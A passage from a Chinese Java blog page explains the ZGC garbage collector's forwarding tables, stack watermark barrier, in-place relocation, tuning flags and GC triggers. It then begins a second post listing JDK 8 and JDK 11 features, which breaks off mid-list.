 <p>转移表<code>ForwardingTable</code>是ZGC确保转移对象后，其他引用指针能够指向最新地址的一种技术，每个页面/分区(<code>ZPage</code>)中都会存在，其实就是该区中所有存活对象的转移记录，也称之为「活跃信息表」。一条线程通过引用来读取对象时，发现对象被转移后就会去转移表中查询最新的地址，并更新地址。这样在并发场景下，用户线程使用读屏障就可以通过转发表拿到新地址，用户线程可以准确访问并发转移阶段的对象了。<br> 转移表中的数据会在发生下一次GC时清空重置，也包括会在下一次GC时触发着色指针的重映射/重定位操作。在下一次GC并发标记阶段会遍历转发表，完成所有的地址转发过程，最后在并发转移准备阶段会清空转发表。<br> <img src="https://img-blog.csdnimg.cn/456fde95f6e04c63baaebded29f7f39b.png" alt="转移表"></p> 
 <h4><a id="_227"></a>并发标记过程</h4> 
 <p>ZGC基于染色指针的并发处理过程：</p> 
 <ul>
  <li>在第一次GC发生前，堆中所有对象的标识为：Remapped 初始状态。</li>
  <li>第一次GC被触发后，此时内存视图已经为开始GC的M0状态。GC线程开始标记，开始扫描，如果对象是Remapped标志，并且该对象根节点可达的，则将其改为M0标识，表示存活对象且已被标记。</li>
  <li>如果标记过程中，扫描到的对象标识已经为M0，代表该对象已经被标记过，或者是GC开始后新分配的对象，这种情况下无需处理。</li>
  <li>在GC开始后，用户线程新创建的对象，会直接标识为和内存视图一致的M0状态。</li>
  <li>在标记阶段，GC线程仅标记用户线程可直接访问的对象还是不够的，实际上还需要把对象的成员变量所引用的对象都进行递归标记。</li>
 </ul> 
 <p>在「标记阶段」结束后，对象要么是M0存活状态，要么是未被标记的Remapped初始状态，说明这些对象不可达，即待回收状态。最终，所有被标记为M0状态的活跃对象都会被放入「活跃信息表」中。等到了「转移阶段」再对这些对象进行处理，流程如下：</p> 
 <ul>
  <li>ZGC选择目标回收区域，开始并发转移，此时内存视图切换为Remapped状态。</li>
  <li>GC线程遍历访问目标区域中的对象，如果对象标识为M0并且存在于活跃表中，则把该对象转移到新的分区/页面空间中，同时将其标识修正为Remapped标志。</li>
  <li>GC线程如果扫描到的对象存在于活跃表中，但标识为Remapped，说明该对象已经转移过了，无需处理。</li>
  <li>用户线程在「转移阶段」新创建的对象，会被标识为和内存视图一致的Remapped状态。</li>
  <li>如果GC线程遍历到的对象不是M0状态或不在活跃表中，说明不可达，也无需转移处理。<br> 最终，当目标区域中的所有存活对象被转移到新的分区后，ZGC统一回收原本的选择的回收区域。至此，一轮GC结束，整个堆空间会正常执行应用任务，直至触发下一轮GC。而当下一轮GC发生时，会采用M1作为GC辅助标识，而并非M0，具体原因在前面分析过了则不再阐述。</li>
 </ul> 
 <h3><a id="_Stack_Watermark_Barrier_243"></a>栈水印屏障 <code>Stack Watermark Barrier</code></h3> 
 <p>JDK16后通过JEP 376提案合入JDK主线，ZGC的又一强大特性。有了这一特性的支持，从JDK 16开始。ZGC现在的暂停时间为O(1)。换句话说，它们是在恒定的时间内执行的，并且不会随着堆、活动对象集或GC Roots根集大小（或其他任何东西）的增加而增加。通过栈水印屏障特性的支持，ZGC实现了常数级暂停，亚毫秒级暂停的能力。</p> 
 <p>栈水印屏障是什么？先看一下官方博客对此的说明</p> 
 <blockquote> 
  <p>在JDK 16之前，ZGC的暂停时间仍然随GC Roots根集的大小（子集）而缩放。更准确地说，ZGC仍然在停止世界阶段扫描线程栈。这意味着，如果一个Java应用有大量的线程，那么暂停时间会增加。如果这些线程有很深的调用栈，那么暂停时间会增加得更多。从JDK 16开始，线程栈的扫描是并发进行的，即在Java应用程序继续运行的同时进行。<br> 栈水印屏障机制，可以防止Java线程在没有首先检查是否可以安全返回的情况下返回到栈帧。可以把它看作是栈帧的读屏障，如果需要的话，它将迫使Java线程在返回到栈帧之前采取某种形式的动作，使栈帧进入安全状态。每个 Java 线程都有一个或多个栈水印屏障，它告诉屏障在没有任何特殊操作的情况下可以在栈中安全地走多远。要走过一个水印，就要走一条慢路，使一个或多个栈帧进入当前安全状态，并更新水印。将所有线程栈带入安全状态的工作通常由一个或多个GC线程处理，但由于这是并发完成的，如果Java线程返回到GC线程尚未到达的栈帧中，有时就必须修复自己的几个栈帧。<br> 有了JEP 376，ZGC现在在Stop-The-World阶段扫描的根数正好为零。</p> 
 </blockquote> 
 <p>虽然说的有些绕，但还是说明了问题和解决方案。</p> 
 <p>问题就是，在JDK 16之前，<strong>ZGC的暂停时间仍然随GC Roots根集的大小增大而增大</strong>，因为ZGC要在程序完全停顿时，去扫描每个线程的所有栈帧中的回收根GCRoots。因为线程一旦运行，回收根很可能就会变化么，这很好理解。在上面的 【ZGC的标记—复制算法】，这一节里看到在<em>初始标记阶段</em>，应用程序是完全暂停的。<br> 所以随着线程增多等原因，GC Roots根集增大，那自然停顿时间也要增加了呗。解决这个问题的方法，当然是和其他阶段一样，尽量使初始标记阶段对GC根集的扫描也和并发标记阶段一样，可以并发的去标记。</p> 
 <p>ZGC对这个问题怎么处理的？读屏障，没错还是读屏障，这次是对于线程栈帧使用的读屏障。</p> 
 <p>简答来说，就是通过<em><strong>栈水印屏障</strong></em>这一机制，用户线程不会在GC线程正在扫描一个线程栈时，进入这个栈。栈水印屏障的读屏障机制，会确保GC线程正在扫描线程的一个栈帧时，用户线程不会进入到这个栈帧里，直到GC线程标记完成。<strong>这一过程是完全并发的，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行，栈顶的栈帧由用户线程负责标记。</strong> 这样就可以做到在标记线程栈中的GC根集同时，用户线程并发运行，无需“停止世界”。</p> 
 <p>下面具体研讨下栈水印屏障的组成和原理</p> 
 <ul>
  <li> <p>栈水印是什么？<br> 上面说到了GC线程需要在用户线程运行时并发的去标记GC根节点，那么用户线程运行时很可能因为方法执行完毕，分支结束等原因弹出当前栈帧，回到上一个栈帧，此时GC根对象的引用关系就可能发生变化。那么问题就是如何检测这种变化？很容易想到就是退回栈时由用户线程去检测变化，重新标记GC根节点（也就是用户线程的一种协作式的标记，和用户线程遇到“坏指针”帮助转移对象一样）那么退回栈后应该扫描多少个栈帧？扫描少了，可能漏标，扫描多了会影响性能。为了降低业务线程扫描栈帧的工作量，HotSpot虚拟机中采用<strong>栈水印</strong>这一机制。<br> 栈水印是一种在运行时栈上的标记，假设线程运行时栈向下增长，发生回栈时，可以区分回到的栈帧是否高于栈水印标记，高于水印标记的栈帧已经被标记完毕，而低于水印标记的栈帧为正在运行的用户线程栈帧。如果回到的栈已经高于栈水印，则此栈不能由 Java 线程直接使用，因为它可能因为引用关系变化而包含过时的对象引用。</p> </li>
  <li> <p>读屏障<br> 栈水印所依赖的一种读屏障。为了降低业务线程扫描栈帧的工作量，HotSpot 中采用单个栈帧扫描的方式，即在回栈时如果超过当前<strong>栈水印标记</strong>，就会进入栈水印屏障，在这个读屏障中会执行一系列操作，去处理当前帧到栈水印标记之前的栈帧，其中因为回栈可能导致引用关系变化的内容。包括修复调用方的对象指针，重新标记此节点的GC根集等。<br> 如果此时GC线程正在标记要回栈的帧，则读屏障会限制用户线程在GC线程标记完成之前不能返回此帧。</p> </li>
  <li> <p>完全并发标记过程</p> 
   <ul>
    <li>完全并发标记GC根集时，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行。线程通过GC安全点时，将通过改变全局变量的方式在逻辑上使 Java 线程栈失效(判定为非用户线程当前帧)。每个无效的栈将被GC线程同时处理，并且继续跟踪剩余的待处理内容直到完成。</li>
    <li>在应用线程回栈时，操作栈钩子会将一些堆栈本地地址与水印进行比较，如果回栈到栈水印之上，则需要去修复栈帧，并且向上移动水印。每次处理过程都包含对此栈帧的调用方和被调用方的处理，所以处理一般发生在栈顶的两帧上。栈水印屏障则在这两帧的后面，而且在用户线程回栈时，栈水印屏障会检查GC线程是否在处理，GC线程在处理后续的帧时，用户线程不能回栈到此帧。</li>
    <li>Java 线程将处理继续执行所需的最小帧数。并发 GC 线程将处理剩余的帧，确保最终扫描完所有线程栈和其他线程GC根集。</li>
   </ul> </li>
 </ul> 
 <p>栈水印屏障 <code>Stack Watermark Barrier</code>的实现非常复杂，即便是ZGC官方博客也没有对其的详细讲解，有兴趣的可以具体去查看源码。</p> 
 <h2><a id="ZGC__275"></a>ZGC 其他特性</h2> 
 <h3><a id="_276"></a>支持非统一内存访问架构</h3> 
 <blockquote> 
  <p>UMA架构：UMA即Uniform Memory Access Architecture（统一内存访问），UMA也就是一般正常电脑的常用架构，一块内存多颗CPU，所有CPU在处理时都去访问一块内存，所以必然就会出现竞争（争夺内存主线访问权），而操作系统为了避免竞争过程中出现安全性问题，注定着也会伴随锁概念存在，有锁在的场景定然就会影响效率。同时CPU访问内存都需要通过总线和北桥，因此当CPU核数越来越多时，渐渐的总线和北桥就成为瓶颈，从而导致使用UMA/SMP架构机器CPU核数越多，竞争会越大，性能会越低。</p> 
 </blockquote> 
 <blockquote> 
  <p>NUMA架构：NUMA即Non Uniform Memory Access Architecture（非统一内存访问），NUMA架构下，每颗CPU都会对应有一块内存，具体内存取决于处理器的内存位置，一般与CPU对应的内存都是在主板上离该CPU最近的，CPU会优先访问这块内存，每颗CPU各自访问距离自己最近的内存，效率自然而然就提高了。<br> NUMA架构允许多台机器共同组成一个服务供给外部使用，NUMA技术可以使众多服务器像单一系统那样运转，该架构在中大型系统上一直非常盛行，也是高性能的解决方案，尤其在系统延迟方面表现都很优秀，因此，实际上堆空间也可以由多台机器的内存组成。</p> 
 </blockquote> 
 <p>通过NUMA非统一内存访问架构，机器得以纵向扩展，硬件性能堆叠，提供TB级内存单元。<br> ZGC是能自动感知处理器是否是NUMA架构，并可以充分利用NUMA架构特性的一款垃圾收集器。<br> ZGC在NUMA架构的处理器上,为活跃线程分配对象时，会就近分配到此线程所在处理器的优先访问内存上。</p> 
 <h3><a id="_288"></a>就地重定位</h3> 
 <p>ZGC使用的是标记—整理算法，也就是优化的标记-复制算法。此算法有个缺陷，就是要复制或者说移动对象，那么内存中必须存在一定的连续空闲空间用于移动对象，如果堆已满，即所有堆区域都已在使用中，那么我们无处可移动对象。<br> 在 JDK 16 之前，ZGC 通过保留堆解决了这个问题。此保留堆是一组被搁置的堆区域，并且对于来自用户线程的正常分配内存不可用。一般保留堆占整个Java堆的15%左右。使用保留堆的方案仍然存在一些缺陷，首先就是堆内存的浪费，其次是保留堆不一定能完全支持整理过程完成，此时可能导致ZGC失败，发生长时间暂停或堆栈溢出异常。<br> 其他收集器，比如G1，可以通过<strong>就地压缩堆</strong>来处理整理算法的需要空闲空间的问题，这种方法的主要优点是它不需要空闲内存来保证整理堆空间以释放内存。换句话说，它将压缩一个完整的堆，而不需要某种堆空间保留。<br> ZGC中将类似的能力称之为<strong>就地重定位<code>In-Place Relocation</code></strong></p> 
 <ul>
  <li>就地重定位<br> <img src="https://img-blog.csdnimg.cn/d3e4f7751ace4bfeb1f395800447cfa2.png#pic_center" alt="就地重定位"><br> 无连续空闲空间，就地重定位，活动对象按顺序移动的空间0</li>
  <li>非就地重定位<br> <img src="https://img-blog.csdnimg.cn/01109030e518436380af789e0d49ba59.png#pic_center" alt="无需就地重定位"><br> 有连续空闲空间 3，无需就地重定位，按整理算法直接移动活动对象到3号空间</li>
 </ul> 
 <p>但是，就地重定位通常会带来更多的性能开销。例如，就地重定位必须顺序的移动对象，否则可能会覆盖尚未移动的对象。此时GC 线程不能进行并行处理移动对象，并且还会影响 Java 线程操作需要GC整理的对象，在这些对象重新定位时会产生一些操作限制。<br> 当有空闲堆区域可用时，不就地重新定位通常性能更好， 而就地重定位可以保证重新定位过程成功完成，即使没有空堆区域可用。总之，这两种方法都有优点。<br> 从 JDK 16 开始，ZGC 现在同时的使用这两种方法来实现两全其美的效果。这使得即便不使用保留堆 ，仍然可以在普通情况下保持良好的转移对象的性能，并保证即便在无空闲空间的危险情况下，仍然可以实现对象整理。<br> <strong>默认情况下，只要存在可用于将对象移动到的空闲堆区域，ZGC 就不会就地重新定位。否则，ZGC将启用就地重定位。一旦重新有空闲堆区域可用，ZGC将再次切换回不使用地重新定位。</strong></p> 
 <h2><a id="Azul_Zing_C4_GC_305"></a>对比Azul Zing C4 GC</h2> 
 <p>C4收集器由Azul的无暂停垃圾收集器PauseLessGC发展而来，相比PauseLess收集器，C4收集器最大的改进就是支持了分代回收模型。<br> 这有点像ZGC的发展历程，目前(截止JDK18)的ZGC都是不支持分代的，而支持分代的ZGC正在开发中。<br> 有观点认为ZGC就是重写的，纯软件实现的Azul PauseLessGC。目前正在追逐接近C4GC的目标。</p> 
 <p>C4全名 Continuously Concurrent Compacting Collector，连续并发压缩回收器。</p> 
 <p>ZGC的完全并发能力，对应C4的 Continuously Concurrent 连续并发能力<br> ZGC的标记—整理算法，就地重定位能力，对应C4的 Compacting 压缩能力<br> 现在也就差分代回收未实现了。<br> 没有分代回收，ZGC在极高对象分配速率时，仍然不及C4GC。</p> 
 <h2><a id="_316"></a>总结</h2> 
 <h3><a id="ZGC__317"></a>ZGC 优点</h3> 
 <ul>
  <li>低停顿，高吞吐量，ZGC收集过程中额外耗费的内存小。 
   <ul>
    <li>低停顿，几乎所有过程都是并发的，只有短暂的STW。</li>
    <li>占用额外的内存小。G1通过写屏障维护记忆集，才能处理跨代指针，得以实现增量回收。记忆集占用大量内存，写屏障对正常程序造成额外负担。而ZGC没有写屏障，卡表之类的。（但这主要得益于ZGC目前没有实现分代回收，要是分代回收实现之后，还会不会这样不好说了）</li>
    <li>吞吐量方面，在ZGC的‘弱项’吞吐量方面，因为和用户线程并发，还是有影响的。但是以低延迟为首要目标的ZGC已经达到了以高吞吐量为目标Parallel Scavenge收集器的99%,直接<strong>超越了G1</strong>。</li>
   </ul> </li>
  <li>支持NUMA架构<br> 现在多CPU插槽的服务器都是NUMA架构，比如两颗CPU插槽(24核)，64G内存的服务器，那其中一颗CPU上的12个核，访问从属于它的32G本地内存，要比访问另外32G远端内存要快得多。<br> 在支持NUMA架构的多核处理器下，ZGC优先在线程当前所处的处理器的本地内存上分配对象，以保证内存高效访问。</li>
  <li>ZGC采用并发的标记-整理算法。没有内存碎片。</li>
 </ul> 
 <h3><a id="ZGC__326"></a>ZGC 缺点</h3> 
 <ul>
  <li>承受的对象分配速率不会太高，因为浮动垃圾。<br> ZGC的停顿时间是在10ms以下，但是ZGC的执行时间还是远远大于这个时间的。<br> 假如ZGC全过程需要执行10分钟，在这个期间由于对象分配速率很高，将创建大量的新对象，这些对象很难进入当次GC，会被直接判定为存活对象，而本轮GC回收期间可能新分配的对象会有大部分对象都成为了“垃圾”，这些只能等到下次GC才能回收的对象就是<strong>浮动垃圾</strong>。可能造成回收到的内存空间小于期间并发产生的浮动垃圾所占的空间。<br> 这个问题通过分代回收能有很大优化，但是目前ZGC还不支持分代。</li>
  <li>ZGC目前不支持分代回收<br> ZGC目前没有实现分代回收，每次都需要进行全堆扫描，导致一些“朝生夕死”的对象没能及时的被回收。所以就不存在Young GC、Old GC，所有的GC行为都是Full GC。</li>
  <li>ZGC在OpenJDK上只有在JDK17以后才正式可用<br> Oracle HotSpotJDK,Adopt OpenJDK等常用JDK在低版本均无生产可用的ZGC，虽然OpenJDK中的ZGC在Java15中正式生产可用，但是Java17才是Java11之后的下一个长期稳定版。可以通过选择AliJDK，TencentJDK等试用规避此问题。</li>
 </ul> 
 <h2><a id="ZGC_336"></a>ZGC使用</h2> 
 <h3><a id="_337"></a>低版本可用</h3> 
 <p>ZGC在Java15正式生产就绪，而下一个长期支持版的Java为Java 17。这对于一些还在使用低版本JDK的开发者来说是个难题，毕竟升级JDK并不是一蹴而就的容易事。<br> 那么有没有办法在Java11即可使用ZGC呢？也有的</p> 
 <p>国内的话，阿里云开源并维护的<code>Ali DragonWell JDK</code>，腾讯开源并维护的 <code>Tencent Kona JDK</code>,均提供了Java11版本下可用的ZGC。并且移植了大量高版本OpenJDK的特性和ZGC问题的修复，如果要在Java11下使用ZGC，选择以上两家的JDK是最后的选择。</p> 
 <p>并不建议在Java11版本的OpenJDK上使用ZGC，因为存在很多在高版本才修复的问题。</p> 
 <h3><a id="ZGC_344"></a>ZGC参数说明</h3> 
 <p>Java 17下启用ZGC指令</p> 
 <pre><code class="prism language-xml">-XX:+UseZGC 
</code></pre> 
 <p>注意不需要使用G1收集器时的关闭CMS收集器指令,因为CMS收集器已经在Java 9中被删除了。</p> 
 <table>
  <thead>
   <tr>
    <th>通用GC选项</th>
    <th>ZGC选项</th>
    <th>ZGC诊断选项</th>
   </tr>
  </thead>
  <tbody>
   <tr>
    <td>-XX:MinHeapSize, -Xms</td>
    <td>-XX:ZAllocationSpikeTolerance</td>
    <td>-XX:ZStatisticsInterval</td>
   </tr>
   <tr>
    <td>-XX:InitialHeapSize, -Xms</td>
    <td>-XX:ZCollectionInterval</td>
    <td>-XX:ZVerifyForwarding</td>
   </tr>
   <tr>
    <td>-XX:MaxHeapSize, -Xmx</td>
    <td>-XX:ZFragmentationLimit</td>
    <td>-XX:ZVerifyMarking</td>
   </tr>
   <tr>
    <td>-XX:SoftMaxHeapSize</td>
    <td>-XX:ZMarkStackSpaceLimit</td>
    <td>-XX:ZVerifyObjects</td>
   </tr>
   <tr>
    <td>-XX:ConcGCThreads</td>
    <td>-XX:ZProactive</td>
    <td>-XX:ZVerifyRoots</td>
   </tr>
   <tr>
    <td>-XX:ParallelGCThreads</td>
    <td>-XX:ZUncommit</td>
    <td>-XX:ZVerifyViews</td>
   </tr>
   <tr>
    <td>-XX:UseDynamicNumberOfGCThreads</td>
    <td>-XX:ZUncommitDelay</td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseLargePages</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseTransparentHugePages</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseNUMA</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:SoftRefLRUPolicyMSPerMB</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:AllocateHeapAt</td>
    <td></td>
    <td></td>
   </tr>
  </tbody>
 </table> 
 <h3><a id="ZGC_366"></a>ZGC的垃圾回收什么情况下会被触发？</h3> 
 <p>ZGC中目前会有四种机制导致GC被触发：</p> 
 <ul>
  <li>①定时触发，默认为不使用，可通过ZCollectionInterval参数配置。</li>
  <li>②预热触发，最多三次，在堆内存达到10%、20%、30%时触发，主要时统计GC时间，为其他GC机制使用。</li>
  <li>③分配速率，基于正态分布统计，计算内存99.9%可能的最大分配速率，以及此速率下内存将要耗尽的时间点，在耗尽之前触发GC「耗尽时间 - 一次GC最大持续时间 - 一次GC检测周期时间」。</li>
  <li>④主动触发，默认开启，可通过ZProactive参数配置，距上次GC堆内存增长10%，或超过5分钟时，对比「距上次GC的间隔时间」和「49*一次GC的最大持续时间」，超过则触发。</li>
 </ul> 
 <h2><a id="ZGC_373"></a>ZGC调优</h2> 
 <p>ZGC 相当智能，我们需要调整的参数很少，由于 ZGC 已经自动将垃圾回收时间控制在 10ms 左右，我们主要关心的是垃圾回收的次数和避免并发回收失败导致的长停顿。</p> 
 <p>ZGC的核心特点是并发，GC过程中一直有新的对象产生。如何保证在GC完成之前，新产生的对象不会将堆占满，是ZGC参数调优的第一大目标。因为在ZGC中，当垃圾来不及回收将堆占满时，会导致正在运行的线程停顿，持续时间可能长达秒级之久。</p> 
 <p>ZGC有多种GC触发机制</p> 
 <ul>
  <li> <p>阻塞内存分配请求触发：<br> 当垃圾来不及回收，垃圾将堆占满时，会导致部分线程阻塞。日志中关键字是“Allocation Stall”。</p> </li>
  <li> <p>基于分配速率的自适应算法：<br> 最主要的 GC 触发方式，其算法原理可简单描述为” ZGC 根据近期的对象分配速率以及 GC 时间，计算出当内存占用达到什么阈值时触发下一次 GC ”。日志中关键字是“Allocation Rate”。</p> </li>
  <li> <p>基于固定时间间隔：<br> 通过ZCollectionInterval控制，适合应对突增流量场景。流量平稳变化时，自适应算法可能在堆使用率达到95%以上才触发GC。流量突增时，自适应算法触发的时机可能会过晚，导致部分线程阻塞。我们通过调整此参数解决流量突增场景的问题，比如定时活动、秒杀等场景。日志中关键字是“Timer”。</p> </li>
  <li> <p>主动触发规则：<br> 类似于固定间隔规则，但时间间隔不固定，是 ZGC 自行算出来的时机。日志中关键字是“Proactive”。其中，最主要使用的是 Allacation Stall GC 和 Allocation Rate GC。我们的调优思路为尽量不出现 Allocation Stall GC , 然后 Allocation Rate GC 尽量少。为了做到不出现 Allocation Stall GC ，我们需要做到垃圾尽量提前回收，不要让堆被占满，所以我们需要在堆内存占满前进行 Allocation Rate GC 。为了 Allocation Rate GC 尽量少，我们需要提高堆的利用率，尽量在堆占用 80% 以上进行 Allocation Rate GC 。基于此，Oracle 官方 ZGC 调优指南只建议我们调整两个参数：</p> </li>
  <li> <p>预热规则：<br> 服务刚启动时出现，一般不需要关注。日志中关键字是“Warmup”。</p> </li>
  <li> <p>外部触发：<br> 代码中显式调用System.gc()触发。 日志中关键字是“System.gc()”。</p> </li>
  <li> <p>元数据分配触发：<br> 元数据区不足时导致，一般不需要关注。 日志中关键字是“Metadata GC Threshold”。</p> </li>
 </ul> 
 <h1><a id="_398"></a>参考</h1> 
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45101064/article/details/123478022">JVM成神路之GC分区篇：G1、ZGC、ShenandoahGC高性能收集器深入剖析</a></p> 
 <p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7215485778029609018#heading-29">ZGC在去哪儿机票运价系统实践</a></p> 
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T08:40:25.000Z" title="2023/4/27 16:40:25">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T08:26:14.439Z" title="2023/4/27 16:26:14">2023-04-27</time>更新</span><span class="level-item">24 分钟读完 (大约3572个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Java%E5%85%AB%E8%82%A1%E6%96%87%E3%80%91JDK8%E4%B8%8EJDK11%E7%9A%84%E5%8C%BA%E5%88%AB/">【Java八股文】JDK8与JDK11的区别</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="java八股文jdk8与jdk11的区别"><a class="markdownIt-Anchor" href="#java八股文jdk8与jdk11的区别">#</a> 【Java 八股文】JDK8 与 JDK11 的区别</h1>
<h3 id="文章目录"><a class="markdownIt-Anchor" href="#文章目录">#</a> 文章目录</h3>
<ul>
<li><a href="#_5">前言</a></li>
<li><a href="#Java8_11">一、Java8 的新特性</a></li>
<li>
<ul>
<li>
<ul>
<li><a href="#Lambda__12">Lambda 表达式</a></li>
<li><a href="#_14">方法引用</a></li>
<li><a href="#_16">函数式接口实例</a></li>
<li><a href="#Java_8__18">Java 8 默认方法</a></li>
<li><a href="#Stream_20">Stream</a></li>
<li><a href="#Optional__22">Optional 类</a></li>
<li><a href="#Nashorn_JavaScript_24">Nashorn JavaScript</a></li>
<li><a href="#_API_26">日期时间 API</a></li>
<li><a href="#Base64_36">Base64</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Java11_46">二、Java11 的新特性</a></li>
<li>
<ul>
<li>
<ul>
<li><a href="#ZGC_48">ZGC</a></li>
<li><a href="#Flight_RecorderJFR_50">Flight Recorder（JFR）</a></li>
<li><a href="#LowOverhead_Heap_Profiling_53">Low-Overhead Heap Profiling</a></li>
<li><a href="#HTTP2_Client_API_55">HTTP/2 Client API</a></li>
<li><a href="#Transport_Layer_Security_TLS_13_57">Transport Layer Security (TLS) 1.3</a></li>
<li><a href="#Improve_Aarch64_Intrinsics_61">Improve Aarch64 Intrinsics</a></li>
<li><a href="#Epsilon_A_NoOp_Garbage_CollectorExperimental_63">Epsilon: A No-Op Garbage Collector(Experimental)</a></li>
<li><a href="#Launch_SingleFile_SourceCode_Programs_65">Launch Single-File Source-Code Programs</a></li>
<li><a href="#Unicode_10_67">Unicode 10</a></li>
<li><a href="#NestBased_Access_Control_69">Nest-Based Access Control</a></li>
<li><a href="#Dynamic_ClassFile_Constants_71">Dynamic Class-File Constants</a></li>
<li><a href="#Remove_the_Java_EE_and_CORBA_Modules_73">Remove the Java EE and CORBA Modules</a></li>
<li><a href="#Deprecate_the_Nashorn_JavaScript_Engine_75">Deprecate the Nashorn JavaScript Engine</a></li>
<li><a href="#Deprecate_the_Pack200_Tools_and_API_77">Deprecate the Pack200 Tools and API</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_80">总结</a></li>
</ul>
<hr>
<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1>
<p>目前市场上主流的稳定版主要是 Java 8 和 Java 11。</p>
<hr>
<h1 id="一-java8的新特性"><a class="markdownIt-Anchor" href="#一-java8的新特性">#</a> 一、Java8 的新特性</h1>
<h3 id="lambda"><a class="markdownIt-Anchor" href="#lambda">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Lambda&amp;spm=1001.2101.3001.7020">Lambda</a> 表达式</h3>
<p>Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性，Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中），使用 Lambda 表达式可以使代码变的更加简洁紧凑。</p>
<h3 id="方法引用"><a class="markdownIt-Anchor" href="#方法引用">#</a> 方法引用</h3>
<p>方法引用通过方法的名字来指向一个方法，方法引用可以使语言的构造更紧凑简洁，减少冗余代码，方法引用使用一对冒号 :: 。</p>
<h3 id="函数式接口"><a class="markdownIt-Anchor" href="#函数式接口">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3&amp;spm=1001.2101.3001.7020">函数式接口</a>实例</h3>
<p>Predicate 接口是一个函数式接口，它接受一个输入参数 T，返回一个布尔值结果。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）。该接口用于测试对象是 true 或 false。</p>
<h3 id="java-8-默认方法"><a class="markdownIt-Anchor" href="#java-8-默认方法">#</a> Java 8 默认方法</h3>
<p>Java 8 新增了接口的默认方法。简单说，默认方法就是接口可以有实现方法，而且不需要实现类去实现其方法。我们只需在方法名前面加个 default 关键字即可实现默认方法。</p>
<h3 id="stream"><a class="markdownIt-Anchor" href="#stream">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Stream&amp;spm=1001.2101.3001.7020">Stream</a></h3>
<p>Stream 使用一种类似用 SQL 语句从数据库查询数据的直观方式来提供一种对 Java 集合运算和表达的高阶抽象。Stream API 可以极大提高 Java 程序员的生产力，让程序员写出高效率、干净、简洁的代码。这种风格将要处理的元素集合看作一种流，流在管道中传输，并且可以在管道的节点上进行处理，比如筛选，排序，聚合等。元素流在管道中经过中间操作（intermediate operation）的处理，最后由最终操作 (terminal operation) 得到前面处理的结果。</p>
<h3 id="optional-类"><a class="markdownIt-Anchor" href="#optional-类">#</a> Optional 类</h3>
<p>Optional 类是一个可以为 null 的容器对象。如果值存在则 isPresent () 方法会返回 true，调用 get () 方法会返回该对象。Optional 是个容器：它可以保存类型 T 的值，或者仅仅保存 null。Optional 提供很多有用的方法，这样我们就不用显式进行空值检测。Optional 类的引入很好的解决空指针异常。</p>
<h3 id="nashorn-javascript"><a class="markdownIt-Anchor" href="#nashorn-javascript">#</a> Nashorn JavaScript</h3>
<p>Nashorn 一个 javascript 引擎。从 JDK1.8 开始，Nashorn 取代 Rhino (JDK 1.6, JDK1.7) 成为 Java 的嵌入式 JavaScript 引擎。Nashorn 完全支持 ECMAScript 5.1 规范以及一些扩展。它使用基于 JSR292 的新语言特性，其中包含在 JDK 7 中引入的 invokedynamic，将 JavaScript 编译成 Java 字节码。与先前的 Rhino 实现相比，这带来了 2 到 10 倍的性能提升。</p>
<h3 id="日期时间-api"><a class="markdownIt-Anchor" href="#日期时间-api">#</a> 日期时间 API</h3>
<p>Java 8 通过发布新的 Date-Time API (JSR 310) 来进一步加强对日期与时间的处理。<br>
在旧版的 Java 中，日期时间 API 存在诸多问题，其中有：</p>
<ol>
<li>非线程安全 − java.util.Date 是非线程安全的，所有的日期类都是可变的，这是 Java 日期类最大的问题之一。</li>
<li>设计很差 − Java 的日期 / 时间类的定义并不一致，在 java.util 和 java.sql 的包中都有日期类，此外用于格式化和解析的类在 java.text 包中定义。java.util.Date 同时包含日期和时间，而 java.sql.Date 仅包含日期，将其纳入 java.sql 包并不合理。另外这两个类都有相同的名字，这本身就是一个非常糟糕的设计。</li>
<li>时区处理麻烦 − 日期类并不提供国际化，没有时区支持，因此 Java 引入了 java.util.Calendar 和 java.util.TimeZone 类，但他们同样存在上述所有的问题。<br>
Java 8 在 java.time 包下提供了很多新的 API。以下为两个比较重要的 API：</li>
<li>Local (本地) − 简化了日期时间的处理，没有时区的问题。</li>
<li>Zoned (时区) − 通过制定的时区处理日期时间。<br>
